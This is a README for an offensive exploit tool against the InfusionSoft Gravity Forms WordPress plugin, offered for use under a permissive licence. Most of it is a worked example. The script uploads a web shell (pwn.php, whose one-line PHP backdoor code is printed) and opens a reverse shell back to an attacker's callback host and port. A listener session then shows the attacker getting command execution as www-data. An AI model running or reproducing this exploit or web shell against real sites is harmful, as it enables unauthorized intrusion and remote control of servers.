# InfusionSoft Gravity Forms Shell Upload
This is an exploit for one of the most [facepalmworthy exploits ever][advisory], hence, I had to add it to the reportoire. Just... Just read the advisory. You will die laughing.

## Usage

To use, simply select which payload you want to use (currently only back_python.php is available, but I plan on adding back_php.php and back_perl.php at a later date). This is the 
"payload.php". You also must specify a callback host and port, along with the URL to the vulnerable Wordpress installation.

Example Use:
```
xrl:~$ python2 delusions.py http://192.168.0.15/wordpress/ back_python.php 192.168.0.9 1337

▓█████▄ ▓█████  ██▓     █    ██   ██████  ██▓ ▒█████   ███▄    █   ██████ 
▒██▀ ██▌▓█   ▀ ▓██▒     ██  ▓██▒▒██    ▒ ▓██▒▒██▒  ██▒ ██ ▀█   █ ▒██    ▒ 
░██   █▌▒███   ▒██░    ▓██  ▒██░░ ▓██▄   ▒██▒▒██░  ██▒▓██  ▀█ ██▒░ ▓██▄   
░▓█▄   ▌▒▓█  ▄ ▒██░    ▓▓█  ░██░  ▒   ██▒░██░▒██   ██░▓██▒  ▐▌██▒  ▒   ██▒
░▒████▓ ░▒████▒░██████▒▒▒█████▓ ▒██████▒▒░██░░ ████▓▒░▒██░   ▓██░▒██████▒▒
 ▒▒▓  ▒ ░░ ▒░ ░░ ▒░▓  ░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░
 ░ ▒  ▒  ░ ░  ░░ ░ ▒  ░░░▒░ ░ ░ ░ ░▒  ░ ░ ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░▒  ░ ░
 ░ ░  ░    ░     ░ ░    ░░░ ░ ░ ░  ░  ░   ▒ ░░ ░ ░ ▒     ░   ░ ░ ░  ░  ░  
   ░       ░  ░    ░  ░   ░           ░   ░      ░ ░           ░       ░  
Exploit for InfusionSoft Gravity Forms Shell Upload. Version: 20150427.1
{+} Using target URL of: http://192.168.0.15/wordpress//wp-content/plugins/infusionsoft/Infusionsoft/utilities/code_generator.php
{+} Our shell is at: http://192.168.0.15/wordpress//wp-content/plugins/infusionsoft/Infusionsoft/utilities/pwn.php
{*} Sending Backconnect to 192.168.0.9:1337...
{*} Sending our payload...
{+} Using 192.168.0.9:1337 as callback...
{+} Dropping shell...
{+} Shell dropped... Triggering...
{+} got shell?
xrl:~$
```

Listener (I suggest using the [tcp-pty-shell-handler][shellhandle]):
```
xrl:~$ python2 /tmp/testing/python-pty-shells/tcp_pty_shell_handler.py -b 0.0.0.0:1337
Got root yet?
Linux htp 3.18.0-kali3-amd64 #1 SMP Debian 3.18.6-1~kali2 (2015-03-02) x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
<ntent/plugins/infusionsoft/Infusionsoft/utilities$ ls
code_generator.php  make_phpstorm_property_hints.php  pwn.php
<ntent/plugins/infusionsoft/Infusionsoft/utilities$ cat pwn.php
<?php @assert(filter_input(0,woot,516)); ?><ntent/plugins/infusionsoft/Infusionsoft/utilities$ :)^C
<ntent/plugins/infusionsoft/Infusionsoft/utilities$ exit
exit
quitting, cleanup
xrl:~$ 
```

## ASCIICAST
If you want, check out the [Asciicast demo][asciicast]. The ASCII art got a bit fucked this time around due to term resizing.
[![asciicast](https://asciinema.org/a/19283.png)](https://asciinema.org/a/19283)

## Licence
Licenced under the [WTFPL][wtfpl]

[advisory]: http://research.g0blin.co.uk/cve-2014-6446/
[asciicast]: https://asciinema.org/a/19283
[wtfpl]: http://www.wtfpl.net/
[shellhandle]: https://github.com/infodox/python-pty-shells
